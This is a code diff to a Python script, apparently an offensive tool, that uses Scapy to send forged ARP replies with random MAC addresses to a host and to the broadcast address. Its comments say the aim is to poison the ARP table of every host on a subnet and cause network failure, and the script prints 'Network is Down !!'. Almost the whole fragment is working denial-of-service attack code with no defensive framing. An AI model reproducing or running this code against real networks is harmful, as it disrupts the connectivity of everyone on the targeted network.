@@ -50,10 +50,10 @@ def arp(host, gateway, mac, iface):
     # sends ARP packets to every host on the network poisoning its ARP table.
     # When the ARP table becomes corrupted, the data flow is completely distorted, leading to network failure.
 
-    victim_packet = Ether(dst=mac) / ARP(op=2, psrc=gateway, pdst=host, hwdst=mac, hwsrc=RandMAC())
-    sendp(victim_packet, iface=iface, verbose=0)
-    gateway_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
-    sendp(gateway_packet, iface=iface, verbose=0)
+    victim_packet = ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
+    sendp(Ether(dst=mac) / victim_packet, iface=iface, verbose=0)
+    gateway_packet = ARP(op=2, psrc=gateway, pdst=host, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC())
+    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / gateway_packet, iface=iface, verbose=0)
 
 def attack(gateway, mac, iface):
     # Poison ARP tables of all hosts in the subnet
@@ -78,6 +78,7 @@ def arpspoof():
     time.sleep(2)
     print(f"[{g}+{r}] {b}{iface}{r} {b}{subnet}{r}  {g}>{r} {gateway}{g}::{r}{mac} {c}Network is Down !!{r}")
     attack(gateway, mac, iface)
+
 
 
 
